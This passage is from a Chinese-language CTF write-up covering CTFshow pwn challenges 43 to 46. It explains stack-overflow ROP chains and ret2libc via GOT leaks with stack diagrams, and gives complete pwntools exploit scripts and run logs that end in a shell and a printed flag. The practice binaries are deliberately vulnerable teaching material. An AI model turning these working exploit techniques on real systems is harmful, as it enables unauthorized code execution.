class="line">+-------------------+  ← system执行完后返回的地址（无用）</span><br><span class="line">|  占位数据(aaaa)   |  [溢出覆盖] 随便填4字节（如0x61616161）</span><br><span class="line">+-------------------+  ← system的参数</span><br><span class="line">| buf2地址(0x804B060)| [溢出覆盖] system(&quot;/bin/sh&quot;)的参数(告诉system执行buf2地址处的字符串)</span><br><span class="line">+-------------------+  ← 溢出后的栈顶（payload末尾）</span><br><span class="line">|       ...         |  更低地址的栈数据</span><br><span class="line"></span><br><span class="line"># 执行流程箭头说明：</span><br><span class="line">ctfshow函数崩溃 → 跳转到gets函数 → 执行gets(buf2) → 接收输入&quot;/bin/sh&quot;写入buf2 → 跳转到pop_ebx → 弹出buf2地址到ebx → 跳转到system函数 → system读取参数buf2 → 执行system(&quot;/bin/sh&quot;) → 获取shell</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这里通过输入传递给 gets 函数。由于payload中已经控制了程序的执行流程，这个输入将成为gets 函数的输入，进而被作为 system 函数的参数执行系统命令。</p>
<p>最终我们这样就执行了system(“&#x2F;bin&#x2F;sh”) 进而实现了我们的目的了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">buf2=<span class="number">0x0804B060</span></span><br><span class="line">gets=elf.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">pop_ebx=<span class="number">0x08048409</span></span><br><span class="line">payload=cyclic(<span class="number">0x6C</span>+<span class="number">4</span>)+p32(gets)+p32(pop_ebx)+p32(buf2)+p32(system)+p32(<span class="number">0</span>)+p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 308</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">/CTFshow_pwn/exp.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : This <span class="keyword">time</span> there is no replacement! How to <span class="keyword">do</span>?</span><br><span class="line">    * *************************************</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag  exp.py  pwn</span><br></pre></td></tr></table></figure>

<h2 id="pwn44"><a href="#pwn44" class="headerlink" title="pwn44"></a>pwn44</h2><p>Hint：64位的 system(); 但是好像没”&#x2F;bin&#x2F;sh” 上面的办法不行了，想想办法</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br><span class="line">$ ROPgadget --binary ./pwn | grep <span class="string">&quot;pop rdi ; ret&quot;</span></span><br><span class="line">0x00000000004007f3 : pop rdi ; ret  </span><br></pre></td></tr></table></figure>

<p>64位程序仍然是关闭栈保护与PIE</p>
<p>IDA查看漏洞函数ctfshow：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">hint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;no shell for you&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是栈溢出漏洞，跟上题一样，有system函数，没有参数，也没有看到可以替代的</p>
<p>我们构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = cyclic(0xA + 8) + p64(pop_rdi) + p64(buf2) + p64(gets) +</span><br><span class="line">p64(pop_rdi) + p64(buf2) + p64(system) </span><br></pre></td></tr></table></figure>

<p>首先利用 pop_rdi 指令将 buf2 的地址加载到 rdi 寄存器中。调用 gets 函数，以 buf2 的地址作为参数，从用户输入中读取数据，并将其存储在 buf2 中。再次利用 pop_rdi 指令将 buf2 的地址加载到rdi 寄存器中。调用 system 函数，以 buf2 的地址作为参数，执行指定的命令。</p>
<p>或者也可以直接套板子ret2libc直接求解也是可以的（在下面的几题也是用的此种做法）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0000000000602080                 public buf2</span><br><span class="line">.bss:0000000000602080 buf2            db    ? ;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 栈布局（高地址 → 低地址）</span><br><span class="line">+-----------------------+  ← 初始栈顶（溢出前）</span><br><span class="line">|        ...            |  其他栈数据</span><br><span class="line">+-----------------------+</span><br><span class="line">|   局部变量（0xA字节）  |  被cyclic(0xA)覆盖</span><br><span class="line">+-----------------------+</span><br><span class="line">|       rbp值           |  旧基址指针（8字节），被cyclic(8)覆盖</span><br><span class="line">+-----------------------+  ← 返回地址（溢出目标）</span><br><span class="line">|   pop rdi地址         |  [溢出覆盖] 第一步：执行pop rdi; ret</span><br><span class="line">+-----------------------+  ← pop rdi的操作数（gets的参数）</span><br><span class="line">|   buf2地址(0x602080)  |  被弹出到rdi寄存器（gets要写入的地址）</span><br><span class="line">+-----------------------+  ← gets执行完后返回的地址</span><br><span class="line">|   gets函数地址        |  [溢出覆盖] 第二步：调用gets函数</span><br><span class="line">+-----------------------+  ← gets执行完后的返回地址</span><br><span class="line">|   pop rdi地址         |  [溢出覆盖] 第三步：再次执行pop rdi; ret</span><br><span class="line">+-----------------------+  ← pop rdi的操作数（system的参数）</span><br><span class="line">|   buf2地址(0x602080)  |  被弹出到rdi寄存器（此时已存&quot;/bin/sh&quot;）</span><br><span class="line">+-----------------------+  ← system执行完后返回的地址（可省略）</span><br><span class="line">|   system函数地址      |  [溢出覆盖] 第四步：调用system函数</span><br><span class="line">+-----------------------+  ← 溢出后的栈顶（payload末尾）</span><br><span class="line">|        ...            |  更低地址的栈数据</span><br><span class="line"></span><br><span class="line"># 执行流程箭头：</span><br><span class="line">溢出后 → pop rdi（rdi=buf2） → 调用gets → 写入&quot;/bin/sh&quot;到buf2 →</span><br><span class="line">pop rdi（rdi=buf2） → 调用system → system读取rdi中buf2的&quot;/bin/sh&quot; → 获取shell</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gets=elf.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x4007f3</span></span><br><span class="line">buf2=<span class="number">0x602080</span></span><br><span class="line">payload=cyclic(<span class="number">0xA</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(buf2)+p64(gets)+p64(pop_rdi)+p64(buf2)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28137</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bit/libc/64bit/libc-2.27.so&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x4007f3</span> <span class="comment"># 0x00000000004007f3 : pop rdi ; ret</span></span><br><span class="line">ret = <span class="number">0x4004fe</span> <span class="comment"># 0x00000000004004fe : ret</span></span><br><span class="line">payload = cyclic(<span class="number">0xA</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +</span><br><span class="line">p64(main)</span><br><span class="line">io.recvuntil(<span class="string">&quot;get system parameter!&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&#x27;puts&#x27;,puts)</span></span><br><span class="line"><span class="string">libc_base = puts - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="string">system = libc_base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">libc_base = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = cyclic(<span class="number">0xA</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(ret) +</span><br><span class="line">p64(system)</span><br><span class="line">io.recvuntil(<span class="string">&quot;get system parameter!&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 333</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">/CTFshow_pwn/exp.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : This <span class="keyword">time</span> there is no replacement! How to <span class="keyword">do</span>?</span><br><span class="line">    * *************************************</span><br><span class="line">get system parameter!</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag  exp.py  pwn</span><br></pre></td></tr></table></figure>

<h2 id="pwn45"><a href="#pwn45" class="headerlink" title="pwn45"></a>pwn45</h2><p>Hint：32位，无 system 无 “&#x2F;bin&#x2F;sh”</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位关闭栈保护关闭PIE</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;O.o?&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Hello CTFshow!\n&quot;</span>, <span class="number">0xEu</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这次发现下面有一个write函数，漏洞点还是在ctfshow函数，跟进查看一下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">103</span>]; <span class="comment">// [esp+Dh] [ebp-6Bh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xC8u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是明显的溢出漏洞了，只是其中的偏移变了，大差不差，现在我们关心的是如何去找到我们所需要的东西呢？现在既没有system，也没有“&#x2F;bin&#x2F;sh”</p>
<ul>
<li><p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</p>
</li>
<li><p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</p>
</li>
</ul>
<p>如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p>
<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于</strong> <strong>libc</strong> <strong>的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>
<p>在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的</p>
<p>地址。</p>
<p>我们大概了解了这个流程后，我们看到程序这次多出了一个write函数，那么我们就选用它来进行泄</p>
<p>露（使用其他的函数也可以，解题方法不唯一）</p>
<p>那么我们先列出一个大纲，去决定我们接下来怎么走：</p>
<ul>
<li><p>泄露write函数地址获取 libc 版本</p>
</li>
<li><p>获取 system 地址与 &#x2F;bin&#x2F;sh 的地址</p>
</li>
<li><p>再次执行源程序</p>
</li>
<li><p>触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’)</p>
</li>
<li><p>再一步步来讲解我们的利用过程：</p>
</li>
</ul>
<ol>
<li><p>泄露libc版本</p>
<p>write函数的原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd,<span class="type">const</span> <span class="type">void</span>*buf,<span class="type">size_t</span> count)</span>;</span><br></pre></td></tr></table></figure>

<p>fd:是文件描述符【<code>0</code> 表示标准输入，<code>1</code> 表示标准输出，<code>2</code> 表示标准错误】（write所对应的是写，即就是0） buf:通常是一个字符串，需要写入的字符串 count：是每次写入的字节数</p>
<p>首先填充(0x6b+4)个字节造成溢出，覆盖到返回地址，返回地址填上write函数的plt地址来调用 write函数，之后跟上main函数地址（重新执行程序，再次利用输入点来进行rop链构造），再设置 write函数；由此可以构造出payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyclic(0x6b+4)        # 填充缓冲区，覆盖到返回地址（0x6b是缓冲区大小，+4覆盖ebp）</span><br><span class="line">p32(write_plt)        # 覆盖返回地址为write函数的PLT地址（调用write）</span><br><span class="line">p32(main)             # write执行完后返回main函数（以便再次触发漏洞）</span><br><span class="line">p32(0)                # write的第一个参数：fd=0（标准输入）</span><br><span class="line">p32(write_got)        # write的第二个参数：buf=write函数在GOT表中的地址</span><br><span class="line">p32(4)                # write的第三个参数：count=4（读取4字节）</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x6b</span>+<span class="number">4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) +</span><br><span class="line">p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write = u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:]) <span class="comment"># 接收4字节地址</span></span><br><span class="line"><span class="comment">#print hex(write)</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)  <span class="comment"># 计算libc加载基址</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>算出程序的偏移量，计算system和bin&#x2F;sh的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造rop获取shell</p>
<p>payload &#x3D; cyclic(0x6b+4) + p32(system) + p32(main) + p32(bin_sh) #main可以是任意值0等</p>
</li>
</ol>
<p>大致流程如此，使用其他函数泄露遵循其他函数的原型，然后加上对应参数即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28202)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x6b</span>+<span class="number">4</span>) + p32(write_plt) + p32(main) +p32(<span class="number">4</span>)+p32(write_got) + p32(<span class="number">1</span>) <span class="comment">#write0,1都可以</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;O.o?&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write = u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x6b</span>+<span class="number">4</span>) + p32(system) + p32(main) + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Opening connection to pwn.challenge.ctf.show on port 28202: Done</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">/CTFshow_pwn/exp.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  io.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">/CTFshow_pwn/exp.py:13: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  write = u32(io.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-4:])</span><br><span class="line">0xf7df06f0</span><br><span class="line">[+] There are multiple libc that meet current constraints :</span><br><span class="line">0 - libc6_2.19-0ubuntu6_amd64</span><br><span class="line">1 - libc6_2.19-0ubuntu4_amd64</span><br><span class="line">2 - libc6_2.19-0ubuntu3_amd64</span><br><span class="line">3 - libc6_2.19-0ubuntu5_amd64</span><br><span class="line">4 - libc-2.36-22.mga9.x86_64</span><br><span class="line">5 - libc6-i386_2.27-3ubuntu1_amd64</span><br><span class="line">6 - libc6_2.17-93ubuntu2_amd64</span><br><span class="line">7 - libc6-i386_2.27-3ubuntu1.3_amd64</span><br><span class="line">8 - libc6-i386_2.27-3ubuntu1.4_amd64</span><br><span class="line">9 - libc6_2.17-93ubuntu4_amd64</span><br><span class="line">[+] Choose one : 5</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">pwn</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">ctfshow&#123;3315b627-b11a-49c3-a8ba-894839004a7e&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn46"><a href="#pwn46" class="headerlink" title="pwn46"></a>pwn46</h2><p>Hint：64位 无 system 无 “&#x2F;bin&#x2F;sh”</p>
<p>大致思路和上一题一样，不同的是64位的，前面也讲了它们的区别，大差不差</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">$ ROPgadget --binary ./pwn | grep <span class="string">&quot;pop .*; ret&quot;</span></span><br><span class="line">0x00000000004005b6 : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004005b5 : add byte ptr [rax], r8b ; pop rbp ; ret</span><br><span class="line">0x0000000000400617 : add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x0000000000400612 : mov byte ptr [rip + 0x201a4f], 1 ; pop rbp ; ret</span><br><span class="line">0x0000000000400677 : nop ; pop rbp ; ret</span><br><span class="line">0x00000000004005b3 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000004005f5 : nop dword ptr [rax] ; pop rbp ; ret</span><br><span class="line">0x00000000004007fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007fe : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400800 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400802 : pop r15 ; ret</span><br><span class="line">0x00000000004007fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007ff : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005b8 : pop rbp ; ret</span><br><span class="line">0x0000000000400803 : pop rdi ; ret</span><br><span class="line">0x0000000000400801 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004007fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400615 : sbb ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret</span><br><span class="line">0x0000000000400614 : sbb r12b, byte ptr [r8] ; add byte ptr [rcx], al ; pop rbp ; ret</span><br></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0x0000000000400803 : pop rdi ; ret</span><br><span class="line">0x0000000000400801 : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">在 x86-64 架构中，函数参数通过寄存器传递：</span><br><span class="line">rdi：第一个参数（文件描述符 fd）</span><br><span class="line">rsi：第二个参数（缓冲区地址 buf）</span><br><span class="line">rdx：第三个参数（写入字节数 count）</span><br><span class="line"></span><br><span class="line">write函数原型为：</span><br><span class="line">ssize_t write(int fd, const void *buf, size_t count);</span><br><span class="line"></span><br><span class="line">ROP 链中：</span><br><span class="line">p64(1)：通过pop rdi将文件描述符1（标准输出）放入rdi。</span><br><span class="line">p64(write_got)：通过pop rsi将write的 GOT 表地址放入rsi，这是我们要泄露的内容。</span><br><span class="line">p64(0)：通过pop r15将r15填充为 0（r15是多余参数，因为write只需要 3 个参数）。</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x400803</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x400801</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(<span class="number">0x70</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(write_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;O.o?&quot;</span>,payload)</span><br><span class="line">write_addr = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-database/db/libc6_2.39-0ubuntu8.4_amd64.so&#x27;</span>)  </span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;write&#x27;, 